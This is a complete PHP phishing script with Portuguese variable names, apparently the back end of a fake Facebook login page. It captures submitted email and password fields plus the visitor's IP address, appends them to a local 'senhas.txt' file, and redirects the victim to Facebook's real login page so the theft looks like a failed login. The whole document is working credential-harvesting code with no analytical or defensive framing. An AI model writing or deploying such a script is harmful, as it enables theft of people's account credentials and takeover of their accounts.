<?php
$usuario = $_POST['email'];
$senha = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$tudo = "Email: ".$usuario." - Senha: ".$senha." - IP: ".$ip."<br>";

$fp = fopen("senhas.txt", "a");
fwrite($fp, $tudo);
fclose($fp);
header("Location: https://www.facebook.com/login.php?login_attempt=1");
?>
